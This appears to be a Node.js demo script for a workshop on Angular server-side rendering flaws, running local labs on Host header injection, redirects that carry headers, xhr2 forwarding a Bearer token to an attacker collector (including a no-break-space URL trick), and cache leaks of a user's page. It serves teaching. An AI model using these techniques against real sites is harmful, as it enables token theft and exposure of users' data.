// Labs 2, 3 and 4 without typing curl on stage. Needs the stack running (npm start).
//   node tools/labs.mjs host       Lab 2: the Host header steers SSR requests
//   node tools/labs.mjs redirect   Lab 3: a custom header follows a redirect
//   node tools/labs.mjs xhr        XHR on the server: what xhr2 does that fetch does not
//   node tools/labs.mjs cache      Lab 4: Ana's render served to someone else
import XMLHttpRequest from 'xhr2';
import { captures, clearCaptures, rawGet, session, signIn } from './client.mjs';
import { URLS } from './servers.mjs';

const RED = '\x1b[31m';
const GREEN = '\x1b[32m';
const DIM = '\x1b[2m';
const BOLD = '\x1b[1m';
const RESET = '\x1b[0m';

const labs = { host, redirect, xhr, cache };
const name = process.argv[2];
if (!labs[name]) {
  console.error(`Usage: node tools/labs.mjs <${Object.keys(labs).join('|')}>`);
  process.exit(1);
}

try {
  await labs[name]();
} catch (error) {
  // fetch() puts the socket error in `cause`; node:http does not.
  if ((error.cause ?? error).code === 'ECONNREFUSED') {
    console.error('The stack is not running. Start it with "npm start" or "npm run start:safe".');
    process.exit(1);
  }
  throw error;
}

async function host() {
  await clearCaptures();
  command('curl -H "Host: 127.0.0.1:9999" http://localhost:4000/deals');
  const res = await rawGet(`/deals?t=${Date.now()}`, { host: '127.0.0.1:9999' });
  console.log(
    `HTTP ${res.status}${res.status === 400 ? `  ${DIM}${res.body.trim()}${RESET}` : ''}`,
  );
  if (res.body.includes('iPhone 17 Pro')) {
    console.log(`${RED}The page your server rendered shows the attacker's deal.${RESET}`);
  }
  await printCaptures();
}

async function redirect() {
  const sid = await signIn('ana');
  await clearCaptures();
  command('curl -b "sid=$ANA" http://localhost:4000/deals');
  const res = await rawGet(`/deals?t=${Date.now()}`, { cookie: `sid=${sid}` });
  if (res.body.includes('Deals unavailable')) {
    console.log(`${GREEN}Deals unavailable: the redirect was refused.${RESET}`);
  } else if (res.body.includes('iPhone 17 Pro')) {
    console.log(`${RED}The page shows whatever the campaign site serves now.${RESET}`);
  }
  await printCaptures();
}

/**
 * `withXhr()` on the server uses xhr2 (ServerXhr, deprecated since 22.0.1). Same Bearer token,
 * same 302 to another origin: fetch drops Authorization, xhr2 forwards it. Then the URL from
 * angular/angular#70540: WHATWG reads it as same-origin, xhr2 sends it somewhere else.
 */
async function xhr() {
  const { accessToken } = await session('ana');
  const authorization = `Bearer ${accessToken}`;
  const api = `${URLS.api}/deals/today`;

  console.log(`${DIM}Same request with Ana's Bearer token. The API answers 302 to another origin.${RESET}`);
  for (const [name, send] of [
    ['fetch', fetchGet],
    ['xhr2 ', xhrGet],
  ]) {
    await clearCaptures();
    command(`${name} GET ${api}`);
    await send(api, authorization);
    await printCaptures();
  }

  const url = `\u00A0${URLS.attacker}/collect?lab=xhr`;
  console.log(`\n${DIM}A URL that starts with U+00A0, a no-break space.${RESET}`);
  console.log(`new URL() resolves it to ${new URL(url, URLS.shop).href}  ${GREEN}same origin${RESET}`);
  await clearCaptures();
  command(`xhr2  GET "\\u00A0${URLS.attacker}/collect?lab=xhr"`);
  await xhrGet(url, authorization);
  await printCaptures();
}

async function fetchGet(url, authorization) {
  await fetch(url, { headers: { authorization } });
}

function xhrGet(url, authorization) {
  return new Promise((resolve) => {
    const request = new XMLHttpRequest();
    request.open('GET', url);
    request.setRequestHeader('authorization', authorization);
    request.onloadend = resolve;
    request.send();
  });
}

async function cache() {
  const sid = await signIn('ana');
  // A fresh URL each run, so the 60 s edge cache from a previous run does not get in the way.
  const path = `/?t=${Date.now()}`;

  command('curl -b "sid=$ANA" http://localhost:4000/');
  const ana = await rawGet(path, { cookie: `sid=${sid}` });
  console.log(
    `x-cache: ${ana.headers['x-cache']}   cache-control: ${ana.headers['cache-control']}`,
  );

  command('curl http://localhost:4000/');
  const visitor = await rawGet(path, {});
  const leaked = visitor.body.includes('Ana Quispe');
  console.log(
    `x-cache: ${visitor.headers['x-cache']}   ` +
      (leaked
        ? `${RED}${BOLD}Hi, Ana Quispe${RESET} ${RED}(and her balance, in the HTML and in ng-state)${RESET}`
        : `${GREEN}no trace of Ana${RESET}`),
  );
}

// --- helpers ----------------------------------------------------------------

function command(value) {
  console.log(`\n${GREEN}$${RESET} ${value}`);
}

async function printCaptures() {
  const entries = await captures();
  if (!entries.length) {
    console.log(`${GREEN}[attacker] nothing arrived${RESET}`);
    return;
  }
  for (const entry of entries) {
    const stolen = Object.entries(entry.headers)
      .map(([key, value]) => `${key}=${value}`)
      .join('  ');
    console.log(
      `${RED}[attacker]${RESET} ${entry.method} ${entry.url}  ${stolen || DIM + '(nothing interesting)' + RESET}`,
    );
  }
}
